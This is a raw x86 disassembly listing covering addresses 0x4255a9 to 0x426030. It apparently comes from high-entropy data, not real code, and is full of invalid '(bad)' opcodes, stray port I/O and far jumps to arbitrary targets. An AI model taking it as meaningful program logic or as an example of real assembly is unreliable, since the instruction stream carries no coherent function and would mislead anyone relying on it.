  4255a9:	jge    0x425621
  4255ab:	std    
  4255ac:	jo     0x425549
  4255ae:	enter  0x1742,0x74
  4255b2:	inc    esi
  4255b3:	push   esi
  4255b4:	aaa    
  4255b5:	data16 cld 
  4255b7:	repnz mov bl,0x7d
  4255ba:	sub    DWORD PTR [eax],ebx
  4255bc:	(bad)
  4255c0:	or     al,0x68
  4255c2:	inc    ebx
  4255c3:	retf   0xe4d2
  4255c6:	mov    eax,0xa24ee3dd
  4255cb:	inc    ecx
  4255cc:	out    0x9,al
  4255ce:	popf   
  4255cf:	mov    esi,0x41b4fe4a
  4255d4:	or     DWORD PTR [eax+0x52090fee],ebp
  4255da:	push   ebx
  4255db:	cmp    DWORD PTR [ebx+0x7f],ecx
  4255de:	adc    BYTE PTR [ecx],dl
  4255e0:	in     al,dx
  4255e1:	mov    ch,0x3
  4255e3:	mov    ds,WORD PTR [ecx-0x7e]
  4255e6:	or     eax,0x5c578969
  4255eb:	mov    eax,ds:0xad
	...
  425654:	add    BYTE PTR [eax],al
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xc498f13a
  425664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425665:	sub    ebp,DWORD PTR [ebp-0xfffe70]
  42566b:	add    BYTE PTR [eax],al
  42566d:	add    BYTE PTR [edi+0x6f],bh
  425670:	gs out 0x17,al
  425673:	inc    edx
  425674:	jle    0x42566d
  425676:	sahf   
  425677:	push   esp
  425678:	scas   eax,DWORD PTR es:[edi]
  425679:	add    edx,DWORD PTR ds:0x1fcf9b81
  42567f:	inc    ecx
  425680:	sub    BYTE PTR [edi-0x5e06bc6],bl
  425686:	mov    esp,0x14cc270
  42568b:	mov    ebp,0xff49cc15
  425690:	data16 (bad) 
  425693:	cmc    
  425694:	pop    ebx
  425695:	and    dl,BYTE PTR [eax+0x22]
  425698:	xchg   ebp,eax
  425699:	pop    edi
  42569a:	sar    DWORD PTR [ecx],cl
  42569c:	push   0x31e16a35
  4256a1:	das    
  4256a2:	xchg   ecx,eax
  4256a3:	sub    DWORD PTR [esi+0xf2da50e],ebp
  4256a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256aa:	pusha  
  4256ab:	add    dh,dl
  4256ad:	push   ss
  4256ae:	mov    ecx,0x6bfd098e
  4256b3:	popf   
  4256b4:	push   esp
  4256b5:	addr16 adc edi,esi
  4256b8:	pop    edi
  4256b9:	pop    ebp
  4256ba:	fwait
  4256bb:	test   DWORD PTR [edi+0x7e555a3a],0xac611558
  4256c5:	ja     0x425671
  4256c7:	icebp  
  4256c8:	je     0x425664
  4256ca:	cwde   
  4256cb:	mov    ds:0x4b1c329f,al
  4256d0:	xor    al,BYTE PTR [esi]
  4256d2:	dec    esi
  4256d3:	test   BYTE PTR [edx],dh
  4256d5:	icebp  
  4256d6:	lds    edx,FWORD PTR [edx+edi*8+0x7f]
  4256da:	xlat   BYTE PTR ds:[ebx]
  4256db:	xchg   esp,eax
  4256dc:	mov    al,0x77
  4256de:	iret   
  4256df:	mov    bh,BYTE PTR [edx]
  4256e1:	rcr    BYTE PTR [esi-0x62dae529],cl
  4256e7:	test   edi,esp
  4256e9:	sbb    DWORD PTR [edx-0x584ed8cb],0x3d
  4256f0:	jp     0x425714
  4256f2:	stos   DWORD PTR es:[edi],eax
  4256f3:	pop    edi
  4256f4:	(bad)  
  4256f6:	inc    edx
  4256f7:	mov    ch,0x2
  4256f9:	fisub  WORD PTR [ebp+0x77]
  4256fc:	ja     0x425775
  4256fe:	scas   al,BYTE PTR es:[edi]
  4256ff:	scas   al,BYTE PTR es:[edi]
  425700:	les    edx,FWORD PTR [edi+0x6931de11]
  425706:	jp     0x42569c
  425708:	fst    QWORD PTR [edx-0x4db35f2d]
  42570e:	scas   al,BYTE PTR es:[edi]
  42570f:	push   es
  425710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425711:	ins    DWORD PTR es:[edi],dx
  425712:	(bad)  
  425713:	lock xchg ecx,eax
  425715:	adc    bh,BYTE PTR [edx]
  425717:	mov    cs,WORD PTR [edx-0x22]
  42571a:	retf   
  42571b:	test   eax,0x23c95977
  425720:	popa   
  425721:	adc    al,0x30
  425723:	add    edi,DWORD PTR [edx-0x43]
  425726:	stos   DWORD PTR es:[edi],eax
  425727:	mov    ch,0x96
  425729:	ja     0x425727
  42572b:	inc    ebx
  42572c:	push   edx
  42572d:	aad    0x55
  42572f:	lods   eax,DWORD PTR ds:[esi]
  425730:	jbe    0x4256bb
  425732:	jg     0x42570e
  425734:	repnz inc edx
  425736:	js     0x4256db
  425738:	cmc    
  425739:	xor    ecx,ecx
  42573b:	ins    BYTE PTR es:[edi],dx
  42573c:	ins    DWORD PTR es:[edi],dx
  42573d:	jle    0x425745
  42573f:	jl     0x425736
  425741:	jmp    0x7f00:0x9d1644b9
  425748:	fwait
  425749:	out    dx,al
  42574a:	(bad)  
  42574b:	jns    0x42572b
  42574d:	jmp    0x32826b55
  425752:	rcl    DWORD PTR [esi],1
  425754:	jbe    0x42571d
  425756:	es mov ecx,0x445e329a
  42575c:	addr16 ja 0x4256fb
  42575f:	fcomp  QWORD PTR [edx+0x58]
  425762:	sbb    esp,DWORD PTR [ecx-0x62]
  425765:	cmp    DWORD PTR [ecx+0x643e2117],esi
  42576b:	sub    eax,0x30
	...
  4257d4:	add    BYTE PTR [eax],al
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x68b6f374
  4257e5:	pusha  
  4257e6:	lods   al,BYTE PTR ds:[esi]
  4257e7:	xchg   ecx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	inc    DWORD PTR [eax]
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	mov    al,0x10
  4257f0:	dec    esp
  4257f1:	mov    DWORD PTR [ecx],eax
  4257f3:	xchg   edi,eax
  4257f4:	call   0x6eb:0xcce34fe
  4257fb:	(bad)  
  4257fc:	xor    DWORD PTR [edx+0x55],0x3a
  425800:	mov    edx,0x28104779
  425805:	jo     0x42580a
  425807:	popa   
  425808:	int    0x35
  42580a:	push   0xdd7fe91a
  42580f:	cmp    DWORD PTR [edi+eax*2+0x4f54fa34],ebp
  425816:	sbb    DWORD PTR [edi+0x4f],edi
  425819:	xor    esi,0x49eab0c4
  42581f:	dec    ebp
  425820:	dec    edi
  425821:	sub    eax,0xd4ea031d
  425826:	cs es pop ss
  425829:	call   0xf284:0x21b1d885
  425830:	cmp    eax,0x6526b168
  425835:	jmp    0xd15d:0x1a523cf1
  42583c:	inc    ebx
  42583d:	je     0x42587b
  42583f:	push   esi
  425840:	push   ebx
  425841:	jmp    0xe50d:0x9bd01f2a
  425848:	push   edx
  425849:	cmc    
  42584a:	stos   DWORD PTR es:[edi],eax
  42584b:	leave  
  42584c:	add    eax,0x785cab36
  425851:	mov    bh,0x6c
  425853:	pop    edx
  425854:	cdq    
  425855:	mov    esp,0x80df21e5
  42585a:	jg     0x425850
  42585c:	jno    0x425852
  42585e:	bound  ebp,QWORD PTR [ebp+0x6a]
  425861:	cmp    eax,0xa3f4911a
  425866:	sbb    ecx,DWORD PTR [ebx]
  425868:	fsin   
  42586a:	scas   eax,DWORD PTR es:[edi]
  42586b:	jns    0x76597267
  425871:	xchg   DWORD PTR [ebp+0x6a2877ba],edx
  425877:	dec    edx
  425878:	pop    edx
  425879:	out    0x4a,al
  42587b:	repnz mov edi,0x6e13bcfa
  425881:	inc    esi
  425882:	cld    
  425883:	ja     0x4258a5
  425885:	imul   esi,DWORD PTR [edx-0x78],0xffffffc1
  425889:	jmp    0xfdb47ff6
  42588e:	ds cld 
  425890:	pop    ebp
  425891:	stos   DWORD PTR es:[edi],eax
  425892:	mov    WORD PTR [ebx],es
  425894:	ds mov esp,0x6edaf7e8
  42589a:	popa   
  42589b:	out    0x4e,eax
  42589d:	sti    
  42589e:	out    0x44,al
  4258a0:	fcomp  DWORD PTR [eax+0x59]
  4258a3:	jp     0x425917
  4258a5:	and    BYTE PTR [ecx+eax*8+0x10d3ac7b],ah
  4258ac:	fwait
  4258ad:	imul   eax,DWORD PTR [ecx+eiz*2+0x92a0d85],0xa2d7671f
  4258b8:	nop
  4258b9:	pusha  
  4258ba:	pop    DWORD PTR [ecx-0x262e8103]
  4258c0:	push   esi
  4258c1:	iret   
  4258c2:	retf   0xf178
  4258c5:	ret    0x3713
  4258c8:	adc    ch,BYTE PTR [edx-0x19bba529]
  4258ce:	iret   
  4258cf:	(bad)  
  4258d0:	out    0x49,al
  4258d2:	stos   BYTE PTR es:[edi],al
  4258d3:	outs   dx,DWORD PTR ds:[esi]
  4258d4:	dec    esp
  4258d5:	sahf   
  4258d6:	mov    esi,0x85a35f0c
  4258db:	or     DWORD PTR [ecx+0x5dc60e39],0xcd6489cb
  4258e5:	stos   BYTE PTR es:[edi],al
  4258e6:	jae    0x42594c
  4258e8:	pop    edx
  4258e9:	test   bl,0x26
  4258ec:	outs   dx,BYTE PTR ds:[esi]
	...
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	(bad)  
  425963:	adc    eax,0x92ab4fdd
  425968:	add    DWORD PTR [eax],eax
  42596a:	inc    DWORD PTR [eax]
  42596c:	add    BYTE PTR [eax],al
  42596e:	out    0x42,al
  425970:	cmp    BYTE PTR [edx-0x51ea315a],ah
  425976:	pop    eax
  425977:	cmp    dl,BYTE PTR [ebx]
  425979:	push   0x74
  42597b:	mov    dh,0x82
  42597d:	dec    ecx
  42597e:	sbb    ebx,edi
  425980:	adc    eax,0xa03f5f10
  425985:	into   
  425986:	jae    0x425a06
  425988:	push   0x8a75ba61
  42598d:	mov    bl,0x61
  42598f:	outs   dx,BYTE PTR ds:[esi]
  425990:	mov    al,ds:0x2caa559e
  425995:	pop    ebx
  425996:	push   ds
  425997:	jl     0x425a0b
  425999:	jno    0x425986
  42599b:	fist   DWORD PTR [ebp-0x23]
  42599e:	jns    0x425966
  4259a0:	xor    ebx,DWORD PTR [eiz*2+0x29c908f5]
  4259a7:	sahf   
  4259a8:	jbe    0x4259f2
  4259aa:	jo     0x4259c9
  4259ac:	neg    BYTE PTR [ecx+0x6d]
  4259af:	push   eax
  4259b0:	sub    BYTE PTR [edi],bh
  4259b2:	jne    0x42597a
  4259b4:	imul   esp,edi,0x1df557bc
  4259ba:	and    al,0x97
  4259bc:	jecxz  0x4259bc
  4259be:	cwde   
  4259bf:	jno    0x42594a
  4259c1:	ja     0x4259a1
  4259c3:	pop    esi
  4259c4:	mov    ecx,0x565285c7
  4259c9:	popa   
  4259ca:	jo     0x425a35
  4259cc:	ja     0x425a01
  4259ce:	adc    dl,dl
  4259d0:	jae    0x425967
  4259d2:	cmp    eax,0x285e0f32
  4259d7:	push   esp
  4259d8:	cmp    DWORD PTR [ebp-0x2d],ecx
  4259db:	push   es
  4259dc:	xor    edi,esi
  4259de:	push   ebp
  4259df:	jmp    0x46006c6
  4259e4:	jl     0x42599c
  4259e6:	call   0x6c902a7f
  4259eb:	dec    esi
  4259ec:	fmul   QWORD PTR [eax+edi*8+0x3c834257]
  4259f3:	int    0x5a
  4259f5:	push   eax
  4259f6:	test   BYTE PTR [ebx+0x15],ch
  4259f9:	pop    eax
  4259fa:	inc    edx
  4259fb:	mov    ah,0x5e
  4259fd:	pop    esi
  4259fe:	aad    0x5
  425a00:	xchg   esp,eax
  425a01:	lahf   
  425a02:	mov    bl,0xcc
  425a04:	scas   eax,DWORD PTR es:[edi]
  425a05:	retf   
  425a06:	pusha  
  425a07:	enter  0x1d0d,0x7b
  425a0b:	in     eax,0x66
  425a0d:	ins    DWORD PTR es:[edi],dx
  425a0e:	push   eax
  425a0f:	cmp    eax,0xd2c348da
  425a14:	push   0x85340083
  425a19:	mov    edi,ss
  425a1b:	dec    ecx
  425a1c:	popa   
  425a1d:	rcr    DWORD PTR [edi-0x74],cl
  425a20:	sub    eax,0x1bfd3ce1
  425a25:	dec    esp
  425a26:	aas    
  425a27:	leave  
  425a28:	das    
  425a29:	(bad)  
  425a2a:	scas   eax,DWORD PTR es:[edi]
  425a2b:	push   eax
  425a2c:	xlat   BYTE PTR ds:[ebx]
  425a2d:	sbb    ebx,DWORD PTR [edi]
  425a2f:	out    dx,al
  425a30:	nop
  425a31:	ffree  st(0)
  425a33:	add    edx,0xffffff92
  425a36:	and    esi,ecx
  425a38:	add    BYTE PTR [ebx],dh
  425a3a:	pop    es
  425a3b:	mov    ?,esi
  425a3d:	loop   0x425a6f
  425a3f:	mov    al,ds:0x2cea4cc7
  425a44:	(bad)  
  425a45:	push   cs
  425a46:	bound  ebp,QWORD PTR [esi-0x7facd66c]
  425a4c:	push   ebx
  425a4d:	jl     0x4259fe
  425a4f:	imul   edx,DWORD PTR [edx+0x760e2e83],0xffffffd2
  425a56:	test   eax,0xc16c91a9
  425a5b:	or     BYTE PTR [edx+0x6e],bh
  425a5e:	test   eax,0xe54cdb2b
  425a63:	and    DWORD PTR [esi-0x44],eax
  425a66:	fs shr eax,1
  425a69:	mov    esp,0x693a9a
	...
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x19e11d84]
  425ae6:	stos   BYTE PTR es:[edi],al
  425ae7:	xchg   ebx,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	inc    DWORD PTR [eax]
  425aec:	add    BYTE PTR [eax],al
  425aee:	push   ds
  425aef:	mov    bl,0x78
  425af1:	mov    cl,0xff
  425af3:	fcomi  st,st(0)
  425af5:	sub    al,dh
  425af7:	ror    DWORD PTR [ebx],0x95
  425afa:	add    al,0x29
  425afc:	test   DWORD PTR [ebp-0x29],ebx
  425aff:	mov    edx,0xeb0c5307
  425b04:	push   eax
  425b05:	and    eax,0xbd8cb32c
  425b0a:	sbb    esi,DWORD PTR [esi+ecx*8-0x10ae00d2]
  425b11:	(bad)  
  425b12:	sti    
  425b13:	sbb    eax,DWORD PTR [ebx]
  425b15:	call   0x751a66ba
  425b1a:	retf   0xa614
  425b1d:	in     al,dx
  425b1e:	sbb    BYTE PTR [esi+0x7d],dl
  425b21:	cmp    ebp,DWORD PTR [edx+ecx*4]
  425b24:	push   eax
  425b25:	mov    edx,0xab8b8435
  425b2a:	add    cl,BYTE PTR [edx]
  425b2c:	loop   0x425b2d
  425b2e:	popa   
  425b2f:	jp     0x425ac1
  425b31:	jg     0x425b2d
  425b33:	stc    
  425b34:	xchg   ebx,eax
  425b35:	cmp    DWORD PTR [edi-0x53],edi
  425b38:	aad    0xcb
  425b3a:	jg     0x425b64
  425b3c:	lods   al,BYTE PTR ds:[esi]
  425b3d:	or     al,0xcb
  425b3f:	pop    es
  425b40:	pop    ss
  425b41:	cmp    al,BYTE PTR [eax]
  425b43:	int    0x23
  425b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b46:	outs   dx,DWORD PTR ds:[esi]
  425b47:	out    0xfe,al
  425b49:	clc    
  425b4a:	lds    edi,FWORD PTR [edx-0x79]
  425b4d:	push   0x62
  425b4f:	pop    edx
  425b50:	sbb    BYTE PTR [eax+0x2a],dl
  425b53:	push   cs
  425b54:	loop   0x425ba3
  425b56:	pop    ss
  425b57:	aaa    
  425b58:	xor    al,BYTE PTR [ebx-0x4de503b9]
  425b5e:	fild   WORD PTR [ebx-0x51]
  425b61:	(bad)  [edx-0x58]
  425b64:	leave  
  425b65:	jmp    0xfc23:0xac5a420e
  425b6c:	xchg   edx,eax
  425b6d:	dec    ecx
  425b6e:	lods   eax,DWORD PTR ds:[esi]
  425b6f:	inc    ecx
  425b70:	rol    DWORD PTR [edi+ebx*1-0x65fd777a],cl
  425b77:	aad    0xb6
  425b79:	clc    
  425b7a:	into   
  425b7b:	adc    bl,BYTE PTR [edi+0x343f1233]
  425b81:	cmc    
  425b82:	mov    eax,ds:0x953d4fe8
  425b87:	ins    DWORD PTR es:[edi],dx
  425b88:	lahf   
  425b89:	outs   dx,BYTE PTR ds:[esi]
  425b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b8b:	jmp    0x6e85:0x593f0e21
  425b92:	inc    ebx
  425b93:	mov    ebp,0x4c41343d
  425b98:	js     0x425b71
  425b9a:	sti    
  425b9b:	jl     0x425bbe
  425b9d:	xchg   esi,eax
  425b9e:	sub    ebx,DWORD PTR [eax]
  425ba0:	dec    edi
  425ba1:	lahf   
  425ba2:	dec    eax
  425ba3:	cmp    dl,BYTE PTR [ebp-0x3b43375e]
  425ba9:	or     ah,ah
  425bab:	sub    DWORD PTR [edx-0x661abdb5],ecx
  425bb1:	adc    dh,BYTE PTR [edx+0x4a]
  425bb4:	lock and eax,0x907b2cf1
  425bba:	mov    edi,0x8f55cfb1
  425bbf:	sub    eax,0x5d034b00
  425bc4:	jg     0x425c00
  425bc6:	cpuid  
  425bc8:	mov    bl,0x4f
  425bca:	mov    edx,0x37741487
  425bcf:	mov    edx,0xb06f9da8
  425bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bd5:	out    0xf,al
  425bd7:	ins    BYTE PTR es:[edi],dx
  425bd8:	push   cs
  425bd9:	loopne 0x425be0
  425bdb:	cs inc ecx
  425bdd:	punpcklbw mm0,DWORD PTR [edx]
  425be0:	fs fwait
  425be2:	out    dx,eax
  425be3:	mov    eax,ebp
  425be5:	mov    ecx,fs
  425be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425be8:	retf   
  425be9:	add    al,0xf0
  425beb:	(bad)  
  425bec:	sub    al,0x0
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	push   eax
  425c63:	pop    ss
  425c64:	mov    DWORD PTR [eax+0x194a9],eax
  425c6a:	inc    DWORD PTR [eax]
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	xchg   BYTE PTR [edx-0x15],bh
  425c71:	sbb    al,0x38
  425c73:	mov    cl,0x8a
  425c75:	call   0xbb44:0x7a6e22c8
  425c7c:	idiv   DWORD PTR [edi]
  425c7e:	ss jp  0x425ca0
  425c81:	add    al,0x4c
  425c83:	addr16 test eax,0xe5d192fd
  425c89:	jne    0x425c52
  425c8b:	add    al,0x4a
  425c8d:	pop    eax
  425c8e:	or     eax,0x60018713
  425c93:	scas   al,BYTE PTR es:[edi]
  425c94:	and    eax,0xb01669e8
  425c99:	jb     0x425c1b
  425c9b:	xor    al,0x34
  425c9d:	std    
  425c9e:	ja     0x425c5b
  425ca0:	inc    ebp
  425ca1:	jns    0x425c75
  425ca3:	inc    esp
  425ca4:	jmp    0x425d25
  425ca6:	repnz outs dx,BYTE PTR ds:[esi]
  425ca8:	mov    ds:0x844302df,al
  425cad:	enter  0x1f6c,0x7d
  425cb1:	les    esi,FWORD PTR [eax]
  425cb3:	test   BYTE PTR [esi+0x53],ch
  425cb6:	fcom   DWORD PTR [esi-0xc]
  425cb9:	adc    eax,0xd63cb766
  425cbe:	ficomp WORD PTR [ecx+0x16a138dd]
  425cc4:	imul   eax,DWORD PTR [ebp+0x1b],0xb94712eb
  425ccb:	ficom  DWORD PTR [ebx+0x42]
  425cce:	repnz xchg ebp,eax
  425cd0:	iret   
  425cd1:	repnz fisttp DWORD PTR [edi+0xa]
  425cd5:	loopne 0x425d43
  425cd7:	dec    eax
  425cd8:	jmp    0x89bb:0x9e8b73e2
  425cdf:	add    BYTE PTR [eax],ah
  425ce1:	pop    ecx
  425ce2:	xchg   esp,eax
  425ce3:	les    eax,FWORD PTR ds:0xaf986c79
  425ce9:	push   es
  425cea:	aas    
  425ceb:	add    al,0x49
  425ced:	mov    eax,ds:0x8f2d321c
  425cf2:	in     eax,dx
  425cf3:	icebp  
  425cf4:	fiadd  DWORD PTR [edx+0x4c]
  425cf7:	gs hlt 
  425cf9:	fwait
  425cfa:	and    eax,0x39bf7812
  425cff:	rep lods al,BYTE PTR ds:[esi]
  425d01:	mov    ch,0x26
  425d03:	addr16 mov esp,0x79f24e37
  425d09:	lds    esi,FWORD PTR [ebp-0x154a7471]
  425d0f:	xchg   ebx,eax
  425d10:	mov    ebp,0x6b965cdf
  425d15:	out    0x10,al
  425d17:	xchg   esp,eax
  425d18:	in     eax,0x8
  425d1a:	dec    edi
  425d1b:	call   0x70a3d597
  425d20:	bswap  esp
  425d22:	lods   al,BYTE PTR ds:[esi]
  425d23:	jno    0x425d8d
  425d25:	cmp    al,0xa5
  425d27:	aam    0x63
  425d29:	fcmovbe st,st(4)
  425d2b:	push   ss
  425d2c:	bound  ecx,QWORD PTR [edx-0x27]
  425d2f:	loop   0x425cfc
  425d31:	fmul   QWORD PTR [esi-0x4e]
  425d34:	(bad)  
  425d35:	sub    DWORD PTR [edx-0x54],esi
  425d38:	jmp    0x425dad
  425d3a:	cmp    esi,edi
  425d3c:	mov    dh,0x35
  425d3e:	je     0x425d5d
  425d40:	out    0x18,al
  425d42:	call   0x5ddcd7b5
  425d47:	clc    
  425d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d49:	sti    
  425d4a:	jbe    0x425cf5
  425d4c:	call   0x4be2:0xc2744950
  425d53:	pop    ebp
  425d55:	push   edi
  425d56:	int    0x41
  425d58:	mov    cl,0x9b
  425d5a:	and    eax,0x3948e6ea
  425d5f:	push   ebx
  425d60:	jmp    0x425d44
  425d62:	add    DWORD PTR [esp+edx*4],edx
  425d65:	push   0x8fa50adb
  425d6a:	jmp    0x425d56
  425d6c:	enter  0x0,0x0
	...
  425dd4:	add    BYTE PTR [eax],al
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x7babc76c,al
  425de6:	test   al,0x95
  425de8:	add    DWORD PTR [eax],eax
  425dea:	inc    DWORD PTR [eax]
  425dec:	add    BYTE PTR [eax],al
  425dee:	mov    cl,0x8b
  425df0:	sbb    BYTE PTR [edx-0x3],al
  425df3:	mov    ecx,0x1bdc200b
  425df8:	dec    ebp
  425df9:	jmp    0xa092:0xa66dc23
  425e00:	mov    ebp,0x456c4fbf
  425e05:	gs inc ebp
  425e07:	push   es
  425e08:	xor    ch,dl
  425e0a:	pusha  
  425e0b:	xchg   ecx,eax
  425e0c:	enter  0x81d,0x50
  425e10:	pushf  
  425e11:	push   edx
  425e12:	test   ebp,ecx
  425e14:	jl     0x425e77
  425e16:	and    al,0x1a
  425e18:	jno    0x425da6
  425e1a:	jns    0x425e2a
  425e1c:	pushf  
  425e1d:	cli    
  425e1e:	xchg   cx,ax
  425e20:	inc    eax
  425e21:	jmp    0x425e6e
  425e23:	sbb    dl,dl
  425e25:	push   ecx
  425e26:	bound  eax,QWORD PTR [edx+0x720cae63]
  425e2c:	in     eax,dx
  425e2d:	sub    ah,BYTE PTR [ebx-0x71]
  425e30:	cmc    
  425e31:	adc    al,dl
  425e33:	ret    0x18d1
  425e36:	aam    0xe6
  425e38:	jb     0x425e8a
  425e3a:	push   cs
  425e3b:	aad    0x26
  425e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e3e:	mov    edx,0x97613609
  425e43:	mov    BYTE PTR [edi-0x579403a6],al
  425e49:	pop    eax
  425e4a:	jnp    0x425e8a
  425e4c:	push   ds
  425e4d:	dec    eax
  425e4e:	dec    ebp
  425e4f:	fsubr  DWORD PTR [ebx+0x2bd38105]
  425e55:	mov    ds:0x2f6949a9,eax
  425e5a:	cld    
  425e5b:	mov    al,ds:0x424ee9ed
  425e60:	cmp    esi,DWORD PTR [ebx+edx*1-0x27435035]
  425e67:	jns    0x425e45
  425e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e6a:	inc    eax
  425e6b:	scas   al,BYTE PTR es:[edi]
  425e6c:	or     BYTE PTR [edi-0x7c],al
  425e6f:	pop    ds
  425e70:	cmp    DWORD PTR [ebp-0x53],esp
  425e73:	xchg   ecx,eax
  425e74:	pop    eax
  425e75:	push   ds
  425e76:	ins    DWORD PTR es:[edi],dx
  425e77:	popa   
  425e78:	arpl   cx,ax
  425e7a:	sbb    ah,BYTE PTR [edi+0x1e462ab6]
  425e80:	pop    eax
  425e81:	jmp    0x425efe
  425e83:	sti    
  425e84:	test   al,0xf4
  425e86:	ficom  DWORD PTR [eax-0x34]
  425e89:	rcl    BYTE PTR [ebx],cl
  425e8b:	dec    esp
  425e8c:	mov    si,0xe632
  425e90:	fst    st(7)
  425e92:	(bad)  
  425e95:	jmp    0x425ef7
  425e97:	mov    bh,0xd5
  425e99:	imul   edi,DWORD PTR [ecx+0xaf48b6d],0x1e125107
  425ea3:	dec    ecx
  425ea4:	stc    
  425ea5:	inc    esi
  425ea6:	mov    al,ds:0x22cef09d
  425eab:	or     BYTE PTR [ebx],ah
  425ead:	sub    al,0x85
  425eaf:	pop    ss
  425eb0:	loope  0x425ee6
  425eb2:	rcl    DWORD PTR [eax],cl
  425eb4:	xchg   ebx,eax
  425eb5:	in     eax,dx
  425eb6:	xchg   esi,eax
  425eb7:	mov    ebx,0xebff60db
  425ebc:	dec    eax
  425ebd:	cmc    
  425ebe:	std    
  425ebf:	jmp    0x807a:0xc09474ed
  425ec6:	hlt    
  425ec7:	outs   dx,DWORD PTR ds:[esi]
  425ec8:	or     DWORD PTR [si+0x1a],esp
  425ecc:	push   edx
  425ecd:	pusha  
  425ece:	pop    eax
  425ecf:	out    0x41,al
  425ed1:	mov    WORD PTR [ebp+ebx*1+0x30e3845c],?
  425ed8:	xlat   BYTE PTR ds:[ebx]
  425ed9:	fwait
  425eda:	sbb    ch,BYTE PTR [eax+0x6]
  425edd:	idiv   DWORD PTR [ebp+0x11]
  425ee0:	loope  0x425ef5
  425ee2:	loop   0x425f5b
  425ee4:	mov    al,ds:0x95e26a44
  425ee9:	clc    
  425eea:	mov    ds:0xe61d,eax
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	or     bh,BYTE PTR ds:0x96a77a18
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	inc    DWORD PTR [eax]
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	mov    eax,0x1d313755
  425f73:	or     DWORD PTR [edx+0x5d05856],esi
  425f79:	xchg   BYTE PTR [ebx],cl
  425f7b:	xchg   edx,eax
  425f7c:	mov    esp,0x6e1e723f
  425f81:	push   ds
  425f82:	add    esp,DWORD PTR [edx+0x68]
  425f85:	sbb    BYTE PTR [ebp+0x29],bl
  425f88:	mov    ebp,DWORD PTR [edi-0x6a22a036]
  425f8e:	or     DWORD PTR [ecx+ebx*2+0x41],esp
  425f92:	xchg   edi,eax
  425f93:	std    
  425f94:	fsub   QWORD PTR [edi-0x23012212]
  425f9a:	add    dl,dh
  425f9c:	mov    bh,0x53
  425f9e:	adc    eax,0xb00e6415
  425fa3:	test   DWORD PTR [ecx-0xb],esp
  425fa6:	xor    DWORD PTR [eax-0xec0e817],ebx
  425fac:	inc    esp
  425fad:	jno    0x425fba
  425faf:	(bad)  
  425fb0:	in     eax,dx
  425fb1:	retf   
  425fb2:	mov    dh,0xc1
  425fb4:	pop    edx
  425fb5:	leave  
  425fb6:	loope  0x425f8b
  425fb8:	add    ch,dh
  425fba:	mov    bl,0x1
  425fbc:	arpl   WORD PTR [esi-0x34d4d5f4],ax
  425fc2:	cmp    dl,dh
  425fc4:	xchg   edi,eax
  425fc5:	mov    esi,0xd8cda3c2
  425fca:	out    0xf8,eax
  425fcc:	mov    bh,0x45
  425fce:	xor    eax,0xd09d4355
  425fd3:	and    BYTE PTR [esi+0x58],0x29
  425fd7:	and    eax,0x23a270ed
  425fdc:	nop
  425fdd:	or     al,0x6a
  425fdf:	in     eax,dx
  425fe0:	sbb    ch,ch
  425fe2:	xchg   ebx,eax
  425fe3:	jo     0x42602c
  425fe5:	inc    ebp
  425fe6:	fstp   DWORD PTR [eax+eiz*8+0x42396fd]
  425fed:	and    al,0xd9
  425fef:	fscale 
  425ff1:	(bad)  
  425ff2:	addr16 or al,0x68
  425ff5:	jmp    0xcf9f012f
  425ffa:	push   ebp
  425ffb:	fld    TBYTE PTR [ecx]
  425ffd:	outs   dx,BYTE PTR ds:[esi]
  425ffe:	test   al,0x4e
  426000:	jecxz  0x425fbf
  426002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426003:	lahf   
  426004:	pop    esp
  426005:	push   ebx
  426006:	lds    ebx,FWORD PTR [edx]
  426008:	push   esi
  426009:	lods   al,BYTE PTR ds:[esi]
  42600a:	inc    ebp
  42600b:	mov    eax,ds:0xc0243993
  426010:	int    0x11
  426012:	ds mov edx,0x18fc6db3
  426018:	fnstsw WORD PTR [ebp-0x758868ee]
  42601e:	mov    BYTE PTR [eax],al
  426020:	or     DWORD PTR [ebp-0x4634c932],edx
  426026:	inc    BYTE PTR [edx+0x7a56f834]
  42602c:	push   eax
  42602d:	ss pop esi
  42602f:	int3   
  426030:	mov    al,0xa3
